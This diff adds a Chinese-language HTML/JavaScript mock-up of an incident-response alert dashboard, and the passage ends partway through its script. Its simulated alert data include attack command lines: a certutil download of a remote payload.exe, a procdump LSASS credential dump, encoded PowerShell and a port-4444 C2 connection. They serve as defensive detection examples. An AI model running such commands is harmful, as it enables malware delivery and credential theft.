@@ -1,0 +1,847 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>实时告警中心 - 模拟原型</title>
+<script src="https://cdn.jsdelivr.net/npm/echarts@5.5.0/dist/echarts.min.js"></script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+  background: #f0f2f5;
+  color: #1f2937;
+  min-height: 100vh;
+}
+
+/* ===== 顶部导航 ===== */
+.topbar {
+  background: #1f2937; color: #fff; height: 56px;
+  display: flex; align-items: center; padding: 0 24px;
+  position: sticky; top: 0; z-index: 100;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+}
+.topbar .logo { font-weight: 700; font-size: 16px; margin-right: 40px; }
+.topbar .logo span { color: #60a5fa; }
+.topbar nav { display: flex; gap: 24px; flex: 1; }
+.topbar nav a {
+  color: #9ca3af; text-decoration: none; font-size: 14px;
+  padding: 4px 0; border-bottom: 2px solid transparent; transition: all .2s;
+}
+.topbar nav a:hover { color: #e5e7eb; }
+.topbar nav a.active { color: #fff; border-bottom-color: #60a5fa; }
+.topbar .badge {
+  display: inline-flex; align-items: center; justify-content: center;
+  min-width: 20px; height: 20px; padding: 0 6px;
+  background: #ef4444; color: #fff; border-radius: 10px;
+  font-size: 11px; font-weight: 600; margin-left: 4px;
+}
+.topbar-right { display: flex; align-items: center; gap: 16px; font-size: 13px; color: #9ca3af; }
+.online-dot { width: 8px; height: 8px; border-radius: 50%; background: #2da44e; display: inline-block; margin-right: 4px; }
+
+/* ===== 主体布局 ===== */
+.layout { display: flex; height: calc(100vh - 56px); }
+
+/* 侧边栏 */
+.sidebar {
+  width: 220px; background: #fff; border-right: 1px solid #e5e7eb;
+  padding: 16px 0; flex-shrink: 0;
+}
+.sidebar-item {
+  display: flex; align-items: center; gap: 10px;
+  padding: 10px 20px; font-size: 14px; color: #374151;
+  cursor: pointer; border-left: 3px solid transparent; transition: all .15s;
+}
+.sidebar-item:hover { background: #f9fafb; }
+.sidebar-item.active {
+  background: #eef2ff; color: #2563eb; border-left-color: #2563eb; font-weight: 600;
+}
+.sidebar-item .count {
+  margin-left: auto; background: #f3f4f6; color: #6b7280;
+  padding: 1px 8px; border-radius: 10px; font-size: 11px;
+}
+.sidebar-item.active .count { background: #dbeafe; color: #2563eb; }
+.sidebar-section { font-size: 11px; color: #9ca3af; padding: 16px 20px 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+
+/* 主内容 */
+.main { flex: 1; overflow-y: auto; padding: 20px 24px; }
+
+/* ===== 统计卡片 ===== */
+.stats-row {
+  display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 20px;
+}
+.stat-card {
+  background: #fff; border: 1px solid #e5e7eb; border-radius: 10px;
+  padding: 16px 18px; position: relative;
+}
+.stat-card .stat-label { font-size: 12px; color: #9ca3af; margin-bottom: 4px; }
+.stat-card .stat-value { font-size: 28px; font-weight: 700; letter-spacing: -0.5px; }
+.stat-card .stat-sub { font-size: 11px; color: #9ca3af; margin-top: 4px; }
+.stat-card .stat-icon {
+  position: absolute; right: 14px; top: 14px;
+  width: 36px; height: 36px; border-radius: 8px;
+  display: flex; align-items: center; justify-content: center; font-size: 18px;
+}
+.critical .stat-value { color: #cf222e; }
+.high .stat-value { color: #d4a72c; }
+.medium .stat-value { color: #0969da; }
+.low .stat-value { color: #656d76; }
+
+/* ===== 工具栏 ===== */
+.toolbar {
+  display: flex; align-items: center; gap: 12px; margin-bottom: 16px; flex-wrap: wrap;
+}
+.toolbar .filter-group { display: flex; gap: 4px; }
+.toolbar .filter-pill {
+  padding: 4px 12px; border-radius: 14px; font-size: 12px;
+  border: 1px solid #e5e7eb; background: #fff; color: #6b7280;
+  cursor: pointer; transition: all .15s;
+}
+.toolbar .filter-pill:hover { background: #f3f4f6; }
+.toolbar .filter-pill.active { background: #2563eb; color: #fff; border-color: #2563eb; }
+.toolbar .search-box {
+  flex: 1; max-width: 280px; position: relative;
+}
+.toolbar .search-box input {
+  width: 100%; padding: 6px 12px 6px 30px; border: 1px solid #e5e7eb;
+  border-radius: 6px; font-size: 13px; outline: none;
+}
+.toolbar .search-box input:focus { border-color: #2563eb; }
+.toolbar .search-box .icon { position: absolute; left: 9px; top: 7px; color: #9ca3af; font-size: 13px; }
+.toolbar .batch-btn {
+  padding: 6px 14px; border: 1px solid #e5e7eb; border-radius: 6px;
+  background: #fff; font-size: 12px; cursor: pointer; color: #374151;
+}
+.toolbar .batch-btn:hover { background: #f3f4f6; }
+
+/* ===== 告警列表 ===== */
+.alert-table {
+  background: #fff; border: 1px solid #e5e7eb; border-radius: 10px; overflow: hidden;
+}
+.alert-table .table-header {
+  display: flex; align-items: center; padding: 12px 16px;
+  background: #f9fafb; border-bottom: 1px solid #e5e7eb;
+  font-size: 12px; color: #6b7280; font-weight: 500;
+}
+.alert-table .table-row {
+  display: flex; align-items: center; padding: 12px 16px;
+  border-bottom: 1px solid #f3f4f6; transition: background .15s;
+  cursor: pointer; font-size: 13px;
+}
+.alert-table .table-row:last-child { border-bottom: none; }
+.alert-table .table-row:hover { background: #f9fafb; }
+.alert-table .table-row.new-alert { animation: highlightRow 2s ease; }
+
+@keyframes highlightRow {
+  0% { background: #fef2f2; }
+  100% { background: transparent; }
+}
+
+.col-checkbox { width: 36px; }
+.col-severity { width: 80px; }
+.col-title { flex: 1; min-width: 0; }
+.col-host { width: 130px; }
+.col-rule { width: 120px; }
+.col-count { width: 50px; text-align: center; }
+.col-time { width: 140px; }
+.col-status { width: 90px; }
+.col-actions { width: 100px; }
+
+.severity-badge {
+  display: inline-flex; align-items: center; gap: 4px;
+  padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: 500;
+}
+.sev-critical { background: #ffebe9; color: #cf222e; }
+.sev-high { background: #fff8c5; color: #9a6700; }
+.sev-medium { background: #ddf4ff; color: #0969da; }
+.sev-low { background: #f3f4f6; color: #656d76; }
+
+.severity-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
+.sdot-critical { background: #cf222e; }
+.sdot-high { background: #d4a72c; }
+.sdot-medium { background: #0969da; }
+.sdot-low { background: #656d76; }
+
+.alert-title { font-weight: 500; color: #1f2937; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.alert-detail { font-size: 11px; color: #9ca3af; margin-top: 2px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.host-name { font-weight: 500; }
+.host-ip { font-size: 11px; color: #9ca3af; }
+.rule-name { font-size: 12px; color: #6b7280; }
+
+.status-badge {
+  padding: 2px 8px; border-radius: 10px; font-size: 11px;
+}
+.st-open { background: #ffebe9; color: #cf222e; }
+.st-ack { background: #fff8c5; color: #9a6700; }
+.st-resolved { background: #e6f6e8; color: #2da44e; }
+.st-dismissed { background: #f3f4f6; color: #9ca3af; }
+
+.action-btn {
+  padding: 3px 8px; border: 1px solid #e5e7eb; border-radius: 4px;
+  background: #fff; font-size: 11px; cursor: pointer; color: #374151;
+  margin-right: 4px;
+}
+.action-btn:hover { background: #f3f4f6; }
+.action-btn.ack { color: #2563eb; border-color: #bfdbfe; }
+.action-btn.resolve { color: #2da44e; border-color: #bbf7d0; }
+.action-btn.dismiss { color: #9ca3af; }
+
+/* ===== 实时浮窗 ===== */
+.floating-alert {
+  position: fixed; bottom: 24px; right: 24px; z-index: 1000;
+  display: flex; flex-direction: column; gap: 8px; max-width: 380px;
+}
+.toast {
+  background: #fff; border-radius: 10px; padding: 14px 16px;
+  box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+  display: flex; gap: 12px; align-items: flex-start;
+  animation: slideIn 0.3s ease;
+  border-left: 4px solid #9ca3af;
+}
+.toast.critical { border-left-color: #cf222e; }
+.toast.high { border-left-color: #d4a72c; }
+.toast.medium { border-left-color: #0969da; }
+@keyframes slideIn {
+  from { transform: translateX(120%); opacity: 0; }
+  to { transform: translateX(0); opacity: 1; }
+}
+.toast-icon { font-size: 20px; line-height: 1; }
+.toast-body { flex: 1; min-width: 0; }
+.toast-title { font-size: 13px; font-weight: 600; color: #1f2937; }
+.toast-desc { font-size: 11px; color: #9ca3af; margin-top: 2px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.toast-time { font-size: 10px; color: #9ca3af; white-space: nowrap; margin-top: 2px; }
+.toast-close {
+  cursor: pointer; color: #9ca3af; font-size: 14px; line-height: 1;
+  padding: 2px; opacity: 0; transition: opacity .2s;
+}
+.toast:hover .toast-close { opacity: 1; }
+
+/* ===== 主机在线状态面板 ===== */
+.host-panel {
+  background: #fff; border: 1px solid #e5e7eb; border-radius: 10px;
+  padding: 16px 18px; margin-bottom: 20px;
+}
+.host-panel .panel-title { font-size: 14px; font-weight: 600; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+.host-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 8px; }
+.host-card {
+  display: flex; align-items: center; gap: 10px;
+  padding: 10px 12px; border-radius: 8px; border: 1px solid #f3f4f6; font-size: 13px;
+}
+.host-card .h-status { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+.host-card .h-online { background: #2da44e; box-shadow: 0 0 4px rgba(45,164,78,0.4); }
+.host-card .h-offline { background: #9ca3af; }
+.host-card .h-name { font-weight: 500; color: #1f2937; }
+.host-card .h-meta { font-size: 10px; color: #9ca3af; margin-top: 1px; }
+.host-card .h-alert-count {
+  margin-left: auto; font-size: 10px; padding: 1px 6px; border-radius: 8px;
+  background: #ffebee; color: #c62828; font-weight: 600;
+}
+
+/* ===== 底部模拟控制条 ===== */
+.sim-bar {
+  position: fixed; bottom: 0; left: 0; right: 0;
+  background: #1f2937; color: #9ca3af; padding: 8px 24px;
+  display: flex; align-items: center; gap: 16px; font-size: 12px; z-index: 100;
+}
+.sim-bar strong { color: #e5e7eb; }
+.sim-bar .sim-btn {
+  padding: 4px 12px; border-radius: 4px; border: 1px solid #374151;
+  background: transparent; color: #e5e7eb; font-size: 11px; cursor: pointer;
+}
+.sim-bar .sim-btn:hover { background: #374151; }
+
+.pagination {
+  display: flex; justify-content: center; align-items: center; gap: 4px;
+  padding: 16px 0; font-size: 13px;
+}
+.pagination .page-btn {
+  padding: 4px 10px; border: 1px solid #e5e7eb; border-radius: 4px;
+  background: #fff; cursor: pointer; font-size: 12px; color: #374151;
+}
+.pagination .page-btn:hover { background: #f3f4f6; }
+.pagination .page-btn.active { background: #2563eb; color: #fff; border-color: #2563eb; }
+.pagination .page-info { color: #6b7280; font-size: 12px; margin: 0 8px; }
+
+/* 详情抽屉 */
+.drawer-overlay {
+  position: fixed; inset: 0; background: rgba(0,0,0,0.3); z-index: 200;
+  display: none; animation: fadeIn .2s;
+}
+.drawer-overlay.open { display: block; }
+.drawer {
+  position: fixed; top: 0; right: -480px; width: 480px; height: 100%;
+  background: #fff; box-shadow: -4px 0 24px rgba(0,0,0,0.1);
+  z-index: 201; transition: right .3s ease; overflow-y: auto;
+}
+.drawer.open { right: 0; }
+.drawer-header {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 20px 24px; border-bottom: 1px solid #e5e7eb;
+}
+.drawer-header h3 { font-size: 16px; }
+.drawer-close { cursor: pointer; font-size: 20px; color: #9ca3af; }
+.drawer-body { padding: 20px 24px; }
+.drawer-section { margin-bottom: 20px; }
+.drawer-section .d-label { font-size: 11px; color: #9ca3af; margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.3px; }
+.drawer-section .d-value { font-size: 14px; color: #1f2937; }
+.drawer-section .d-detail { font-size: 12px; color: #6b7280; margin-top: 4px; line-height: 1.6; }
+.drawer-divider { height: 1px; background: #f3f4f6; margin: 16px 0; }
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+/* 模拟声音波动画 */
+.sound-wave {
+  display: none; align-items: center; gap: 2px; height: 16px;
+}
+.sound-wave.active { display: flex; }
+.sound-wave .bar {
+  width: 3px; background: #2da44e; border-radius: 1px;
+  animation: wave 0.5s ease infinite alternate;
+}
+.sound-wave .bar:nth-child(1) { height: 6px; animation-delay: 0s; }
+.sound-wave .bar:nth-child(2) { height: 10px; animation-delay: 0.1s; }
+.sound-wave .bar:nth-child(3) { height: 14px; animation-delay: 0.2s; }
+.sound-wave .bar:nth-child(4) { height: 10px; animation-delay: 0.3s; }
+.sound-wave .bar:nth-child(5) { height: 6px; animation-delay: 0.4s; }
+@keyframes wave {
+  from { transform: scaleY(0.5); }
+  to { transform: scaleY(1); }
+}
+</style>
+</head>
+<body>
+
+<!-- ===== 顶部导航 ===== -->
+<div class="topbar">
+  <div class="logo">IR <span>Platform</span></div>
+  <nav>
+    <a href="#">案件管理</a>
+    <a href="#" class="active">
+      实时告警
+      <span class="badge" id="headerBadge">18</span>
+    </a>
+    <a href="#">AI 分析</a>
+    <a href="#">规则管理</a>
+    <a href="#">知识库</a>
+    <a href="#">主机列表</a>
+  </nav>
+  <div class="topbar-right">
+    <span><span class="online-dot"></span>4 台在线 / 7 台总计</span>
+    <span id="liveTime"></span>
+  </div>
+</div>
+
+<!-- ===== 布局 ===== -->
+<div class="layout">
+  <!-- 侧边栏 -->
+  <div class="sidebar">
+    <div class="sidebar-section">告警中心</div>
+    <div class="sidebar-item active">
+      🚨 全部告警
+      <span class="count" id="sidebarTotal">18</span>
+    </div>
+    <div class="sidebar-item">
+      🔴 严重
+      <span class="count" style="color:#cf222e;background:#ffebe9;">3</span>
+    </div>
+    <div class="sidebar-item">
+      🟡 高危
+      <span class="count" style="color:#9a6700;background:#fff8c5;">7</span>
+    </div>
+    <div class="sidebar-item">
+      🔵 中危
+      <span class="count" style="color:#0969da;background:#ddf4ff;">5</span>
+    </div>
+    <div class="sidebar-item">
+      ⚪ 低危
+      <span class="count">3</span>
+    </div>
+    <div class="sidebar-section">主机状态</div>
+    <div class="sidebar-item">🟢 在线</div>
+    <div class="sidebar-item">⚪ 离线</div>
+    <div class="sidebar-section">设置</div>
+    <div class="sidebar-item">🔔 告警通知</div>
+    <div class="sidebar-item">🔇 静默时段</div>
+  </div>
+
+  <!-- 主内容 -->
+  <div class="main">
+    <!-- 统计行 -->
+    <div class="stats-row">
+      <div class="stat-card critical">
+        <div class="stat-label">待处理告警</div>
+        <div class="stat-value" id="statOpen">18</div>
+        <div class="stat-sub">较昨日 <strong style="color:#cf222e;">↑ 5</strong></div>
+        <div class="stat-icon" style="background:#ffebe9;">🚨</div>
+      </div>
+      <div class="stat-card high">
+        <div class="stat-label">今日新增</div>
+        <div class="stat-value" id="statToday">12</div>
+        <div class="stat-sub">最近 1h <strong id="statHourly">3</strong> 条</div>
+        <div class="stat-icon" style="background:#fff8c5;">📈</div>
+      </div>
+      <div class="stat-card medium">
+        <div class="stat-label">已确认</div>
+        <div class="stat-value" id="statAck">4</div>
+        <div class="stat-sub">待处置 <strong style="color:#cf222e;">14</strong> 条</div>
+        <div class="stat-icon" style="background:#ddf4ff;">✅</div>
+      </div>
+      <div class="stat-card low">
+        <div class="stat-label">平均响应时间</div>
+        <div class="stat-value">4.2<span style="font-size:16px;">min</span></div>
+        <div class="stat-sub">较昨日 <strong style="color:#2da44e;">↓ 1.5min</strong></div>
+        <div class="stat-icon" style="background:#f3f4f6;">⏱</div>
+      </div>
+    </div>
+
+    <!-- 主机在线面板 -->
+    <div class="host-panel">
+      <div class="panel-title">🖥 主机状态 <span style="font-size:12px;color:#9ca3af;font-weight:400;">在线 / 离线</span></div>
+      <div class="host-grid" id="hostGrid"></div>
+    </div>
+
+    <!-- 工具栏 -->
+    <div class="toolbar">
+      <div class="filter-group">
+        <span class="filter-pill active" onclick="setFilter(this,'all')">全部</span>
+        <span class="filter-pill" onclick="setFilter(this,'critical')">严重</span>
+        <span class="filter-pill" onclick="setFilter(this,'high')">高危</span>
+        <span class="filter-pill" onclick="setFilter(this,'medium')">中危</span>
+        <span class="filter-pill" onclick="setFilter(this,'low')">低危</span>
+      </div>
+      <div class="filter-group" style="margin-left:8px;">
+        <span class="filter-pill active" onclick="setStatusFilter(this,'all')">全部状态</span>
+        <span class="filter-pill" onclick="setStatusFilter(this,'open')">未处理</span>
+        <span class="filter-pill" onclick="setStatusFilter(this,'acknowledged')">已确认</span>
+        <span class="filter-pill" onclick="setStatusFilter(this,'resolved')">已解决</span>
+      </div>
+      <div class="search-box">
+        <span class="icon">🔍</span>
+        <input placeholder="搜索告警标题、主机、规则..." oninput="filterAlerts(this.value)">
+      </div>
+      <button class="batch-btn" onclick="batchAck()">✅ 批量确认</button>
+      <button class="batch-btn" onclick="batchResolve()">✅ 批量解决</button>
+    </div>
+
+    <!-- 告警表格 -->
+    <div class="alert-table" id="alertTable">
+      <div class="table-header">
+        <span class="col-checkbox"><input type="checkbox" id="selectAll" onchange="toggleAll(this)"></span>
+        <span class="col-severity">严重度</span>
+        <span class="col-title">告警内容</span>
+        <span class="col-host">主机</span>
+        <span class="col-rule">规则</span>
+        <span class="col-count">次数</span>
+        <span class="col-time">触发时间</span>
+        <span class="col-status">状态</span>
+        <span class="col-actions">操作</span>
+      </div>
+      <div id="alertRows"></div>
+    </div>
+
+    <!-- 分页 -->
+    <div class="pagination">
+      <button class="page-btn">‹</button>
+      <button class="page-btn active">1</button>
+      <button class="page-btn">2</button>
+      <button class="page-btn">3</button>
+      <span class="page-info">共 3 页</span>
+      <button class="page-btn">›</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== 实时浮窗 ===== -->
+<div class="floating-alert" id="floatingAlert"></div>
+
+<!-- ===== 详情抽屉 ===== -->
+<div class="drawer-overlay" id="drawerOverlay" onclick="closeDrawer()"></div>
+<div class="drawer" id="drawer">
+  <div class="drawer-header">
+    <h3 id="drawerTitle">告警详情</h3>
+    <span class="drawer-close" onclick="closeDrawer()">✕</span>
+  </div>
+  <div class="drawer-body" id="drawerBody"></div>
+</div>
+
+<!-- ===== 模拟控制条 ===== -->
+<div class="sim-bar">
+  <span>🧪 <strong>模拟控制</strong></span>
+  <button class="sim-btn" onclick="simulateAlert()">⚡ 模拟新告警</button>
+  <button class="sim-btn" onclick="simulateBurst()">🔥 模拟告警暴增</button>
+  <span class="sound-wave" id="soundWave">
+    <span class="bar"></span><span class="bar"></span><span class="bar"></span>
+    <span class="bar"></span><span class="bar"></span>
+  </span>
+  <span style="margin-left:auto;">已产生 <strong id="totalGenerated">18</strong> 条告警 | 最后事件: <span id="lastEventTime">刚刚</span></span>
+</div>
+
+<script>
+// ===== 模拟数据 =====
+const hosts = [
+  { name: 'WEB-SRV-01', ip: '192.168.1.50', online: true, alerts: 5 },
+  { name: 'DB-SRV-02', ip: '192.168.1.60', online: true, alerts: 3 },
+  { name: 'TEST-PC-001', ip: '192.168.1.100', online: true, alerts: 7 },
+  { name: 'DC-01', ip: '192.168.1.10', online: false, alerts: 0 },
+  { name: 'FILE-SRV-01', ip: '192.168.1.70', online: true, alerts: 2 },
+  { name: 'MAIL-SRV-01', ip: '192.168.1.80', online: false, alerts: 1 },
+  { name: 'APP-SRV-01', ip: '192.168.1.90', online: true, alerts: 0 },
+];
+
+const alertTemplates = [
+  { severity: 'critical', title: 'certutil 远程下载执行', detail: 'certutil.exe -urlcache -split http://185.220.101.1/payload.exe', rule: 'P0-CERTUTIL-DL', host: 'WEB-SRV-01' },
+  { severity: 'critical', title: 'LSASS 进程凭据转储', detail: 'procdump.exe -ma lsass.exe -o C:\\Users\\admin\\Temp\\lsass.dmp', rule: 'P0-CRED-DUMP', host: 'FILE-SRV-01' },
+  { severity: 'critical', title: 'WebShell 疑似命令执行', detail: 'w3wp.exe 创建子进程 cmd.exe /c whoami', rule: 'P0-WEBSHELL', host: 'TEST-PC-001' },
+  { severity: 'high', title: 'PSEXESVC 服务安装', detail: 'EventID 7045 · 源 IP 192.168.1.50 → System service PSEXESVC', rule: 'P1-LATERAL', host: 'DB-SRV-02' },
+  { severity: 'high', title: '计划任务伪装系统更新', detail: 'MicrosoftEdgeUpdateTask → powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', rule: 'P1-PERSIST', host: 'TEST-PC-001' },
+  { severity: 'high', title: 'PowerShell 编码命令执行', detail: 'powershell.exe -EncodedCommand SQBFAFgAIABOAEUAVwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAA=', rule: 'P1-PS-ENC', host: 'WEB-SRV-01' },
+  { severity: 'high', title: '异常出站流量 - 高风险端口', detail: '连接 45.33.32.156:4444 · ESTABLISHED · PID 3204', rule: 'P1-C2-PORT', host: 'TEST-PC-001' },
+  { severity: 'medium', title: 'IOC 命中 - 恶意域名', detail: 'DNS 解析 botnet-c2.example.net · PID 2010 · svchost.exe', rule: 'P2-IOC', host: 'WEB-SRV-01' },
+  { severity: 'medium', title: '管理员账户远程登录', detail: '管理员 admin 从 10.0.0.50 远程登录 · EventID 4624', rule: 'P2-RDP-LOGIN', host: 'DB-SRV-02' },
+  { severity: 'medium', title: '新服务注册 - 可疑路径', detail: '服务名 VMTools 注册为 C:\\Users\\Public\\svchost.exe', rule: 'P2-SVC-TAMPER', host: 'FILE-SRV-01' },
+  { severity: 'medium', title: '系统安全日志被清除', detail: 'EventID 1102 · 安全日志被清除 · 用户 SYSTEM', rule: 'P2-LOG-CLEAR', host: 'TEST-PC-001' },
+  { severity: 'low', title: '计划任务创建 - 新任务', detail: 'schtasks /create /tn "SystemUpdate" /tr "cmd.exe /c ..."', rule: 'P3-SCHTASK', host: 'MAIL-SRV-01' },
+  { severity: 'low', title: 'USB 设备接入记录', detail: '新 USB 存储设备 Kingston 32GB · 序列号 4C53000101022610', rule: 'P3-USB', host: 'DC-01' },
+  { severity: 'low', title: '系统时间修改', detail: '系统时间被修改 · 旧: 2026-07-12 23:50 · 新: 2026-07-13 06:30', rule: 'P3-TIME', host: 'APP-SRV-01' },
+];
+
+const detailMessages = {
+  'P0-CERTUTIL-DL': { desc: 'certutil 是 Windows 内置工具，攻击者常利用它从远程服务器下载恶意载荷。建议立即阻断目标 IP 通信，排查进程创建链。', mitre: 'T1105', suggestion: '1. 确认进程启动用户\n2. 隔离受影响主机\n3. 拉取远端 payload 样本分析' },
+  'P0-CRED-DUMP': { desc: 'LSASS 进程是 Windows 凭据管理的核心进程，procdump 转储 LSASS 内存是攻击者窃取凭据的经典手法。', mitre: 'T1003.001', suggestion: '1. 立即轮转所有账户密码\n2. 检查是否有横向移动迹象\n3. 启用 LSASS 保护（RunAsPPL）' },
+};
+
+// ===== 状态 =====
+let alerts = [];
+let selectedAlerts = new Set();
+let alertId = 0;
+let totalGenerated = 18;
+let currentFilter = 'all';
+let currentStatusFilter = 'all';
+let searchQuery = '';
+let toastTimeout = null;
+
+// ===== 生成初始告警 =====
+function generateAlerts() {
+  const base = [
+    { severity: 'critical', title: 'certutil 远程下载执行', detail: 'certutil.exe -urlcache -split http://185.220.101.1/payload.exe', rule: 'P0-CERTUTIL-DL', host: 'WEB-SRV-01', ip: '192.168.1.50', count: 3 },
+    { severity: 'critical', title: 'LSASS 进程凭据转储', detail: 'procdump.exe -ma lsass.exe -o C:\\Users\\admin\\Temp\\lsass.dmp', rule: 'P0-CRED-DUMP', host: 'FILE-SRV-01', ip: '192.168.1.70', count: 1 },
+    { severity: 'critical', title: 'WebShell 疑似命令执行', detail: 'w3wp.exe → cmd.exe /c whoami · PID 2010', rule: 'P0-WEBSHELL', host: 'TEST-PC-001', ip: '192.168.1.100', count: 2 },
+    { severity: 'high', title: 'PSEXESVC 服务安装', detail: 'EventID 7045 · 源 192.168.1.50 → System service', rule: 'P1-LATERAL', host: 'DB-SRV-02', ip: '192.168.1.60', count: 1 },
+    { severity: 'high', title: '计划任务伪装系统更新', detail: 'MicrosoftEdgeUpdateTask → powershell -enc SQBFAFgA...', rule: 'P1-PERSIST', host: 'TEST-PC-001', ip: '192.168.1.100', count: 5 },
+    { severity: 'high', title: 'PowerShell 编码命令执行', detail: 'powershell.exe -EncodedCommand SQBFAFgAIABOAEUAVwAtAE8AYgBqAGUAYwB0AA==', rule: 'P1-PS-ENC', host: 'WEB-SRV-01', ip: '192.168.1.50', count: 3 },
+    { severity: 'high', title: '异常出站流量 - 高风险端口', detail: '45.33.32.156:4444 ESTABLISHED · PID 3204', rule: 'P1-C2-PORT', host: 'TEST-PC-001', ip: '192.168.1.100', count: 2 },
+    { severity: 'medium', title: 'IOC 命中 - 恶意域名', detail: 'botnet-c2.example.net · PID 2010 · svchost.exe', rule: 'P2-IOC', host: 'WEB-SRV-01', ip: '192.168.1.50', count: 8 },
+    { severity: 'medium', title: '管理员账户远程登录', detail: 'admin 从 10.0.0.50 · EventID 4624', rule: 'P2-RDP-LOGIN', host: 'DB-SRV-02', ip: '192.168.1.60', count: 4 },
+    { severity: 'medium', title: '新服务注册 - 可疑路径', detail: 'VMTools → C:\\Users\\Public\\svchost.exe', rule: 'P2-SVC-TAMPER', host: 'FILE-SRV-01', ip: '192.168.1.70', count: 1 },
+    { severity: 'medium', title: '系统安全日志被清除', detail: 'EventID 1102 · 安全日志清除 · SYSTEM', rule: 'P2-LOG-CLEAR', host: 'TEST-PC-001', ip: '192.168.1.100', count: 1 },
+    { severity: 'low', title: '计划任务创建 - SystemUpdate', detail: 'schtasks /create /tn "SystemUpdate" /tr "cmd..."', rule: 'P3-SCHTASK', host: 'MAIL-SRV-01', ip: '192.168.1.80', count: 1 },
+    { severity: 'low', title: 'USB 设备接入', detail: 'Kingston 32GB · 4C53000101022610', rule: 'P3-USB', host: 'DC-01', ip: '192.168.1.10', count: 2 },
+    { severity: 'low', title: '系统时间修改', detail: '旧: 2026-07-12 23:50 → 新: 06:30', rule: 'P3-TIME', host: 'APP-SRV-01', ip: '192.168.1.90', count: 1 },
+  ];
+  
+  const now = new Date();
+  alerts = base.map((a, i) => ({
+    id: ++alertId,
+    ...a,
+    status: i < 4 ? 'open' : (i < 8 ? 'open' : (i < 12 ? 'acknowledged' : 'resolved')),
+    time: new Date(now - (base.length - i) * 60000 * 3).toISOString(),
+  }));
+  totalGenerated = alerts.length;
+  renderAll();
+}
+
+// ===== 主机面板 =====
+function renderHosts() {
+  const grid = document.getElementById('hostGrid');
+  grid.innerHTML = hosts.map(h => `
+    <div class="host-card">
+      <span class="h-status ${h.online ? 'h-online' : 'h-offline'}"></span>
+      <div>
+        <div class="h-name">${h.name}</div>
+        <div class="h-meta">${h.ip}${h.online ? ' · 在线' : ' · 离线'}</div>
+      </div>
+      ${h.alerts > 0 ? `<span class="h-alert-count">${h.alerts}</span>` : ''}
+    </div>
+  `).join('');
+}
+
+// ===== 渲染告警 =====
+function renderAlerts() {
+  const container = document.getElementById('alertRows');
+  
+  let filtered = alerts.filter(a => {
+    if (currentFilter !== 'all' && a.severity !== currentFilter) return false;
+    if (currentStatusFilter !== 'all' && a.status !== currentStatusFilter) return false;
+    if (searchQuery) {
+      const q = searchQuery.toLowerCase();
+      return a.title.toLowerCase().includes(q) || a.host.toLowerCase().includes(q) || a.rule.toLowerCase().includes(q);
+    }
+    return true;
+  });
+
+  if (filtered.length === 0) {
+    container.innerHTML = `<div style="padding:40px;text-align:center;color:#9ca3af;font-size:14px;">暂无匹配告警</div>`;
+    return;
+  }
+
+  container.innerHTML = filtered.map(a => {
+    const sevClass = `sev-${a.severity}`;
+    const sdotClass = `sdot-${a.severity}`;
+    const statusClass = a.status === 'open' ? 'st-open' : a.status === 'acknowledged' ? 'st-ack' : 'st-resolved';
+    const statusLabel = a.status === 'open' ? '未处理' : a.status === 'acknowledged' ? '已确认' : '已解决';
+    const checked = selectedAlerts.has(a.id) ? 'checked' : '';
+
+    return `<div class="table-row" onclick="openDrawer(${a.id})">
+      <span class="col-checkbox"><input type="checkbox" ${checked} onclick="event.stopPropagation();toggleSelect(${a.id})"></span>
+      <span class="col-severity"><span class="severity-badge ${sevClass}"><span class="severity-dot ${sdotClass}"></span> ${severityLabel(a.severity)}</span></span>
+      <span class="col-title">
+        <div class="alert-title">${severityIcon(a.severity)} ${a.title}</div>
+        <div class="alert-detail">${a.detail}</div>
+      </span>
+      <span class="col-host"><div class="host-name">${a.host}</div><div class="host-ip">${a.ip}</div></span>
+      <span class="col-rule"><span class="rule-name">${a.rule}</span></span>
+      <span class="col-count">${a.count > 1 ? `<strong style="color:#cf222e;">${a.count}</strong>` : a.count}</span>
+      <span class="col-time" style="font-size:12px;color:#6b7280;">${formatTime(a.time)}</span>
+      <span class="col-status"><span class="status-badge ${statusClass}">${statusLabel}</span></span>
+      <span class="col-actions" onclick="event.stopPropagation()">
+        ${a.status === 'open' ? `<button class="action-btn ack" onclick="ackAlert(${a.id})">确认</button><button class="action-btn resolve" onclick="resolveAlert(${a.id})">解决</button>` : ''}
+        ${a.status === 'acknowledged' ? `<button class="action-btn resolve" onclick="resolveAlert(${a.id})">解决</button>` : ''}
+        <button class="action-btn dismiss" onclick="dismissAlert(${a.id})">忽略</button>
+      </span>
+    </div>`;
+  }).join('');
+}
+
+function severityLabel(s) {
+  return { critical: '严重', high: '高危', medium: '中危', low: '低危' }[s] || s;
+}
+function severityIcon(s) {
+  return { critical: '🔴', high: '🟡', medium: '🔵', low: '⚪' }[s] || '';
+}
+function formatTime(iso) {
+  const d = new Date(iso);
+  const now = new Date();
+  const diff = Math.floor((now - d) / 1000);
+  if (diff < 60) return '刚刚';
+  if (diff < 3600) return Math.floor(diff / 60) + ' 分钟前';
+  if (diff < 86400) return Math.floor(diff / 3600) + ' 小时前';
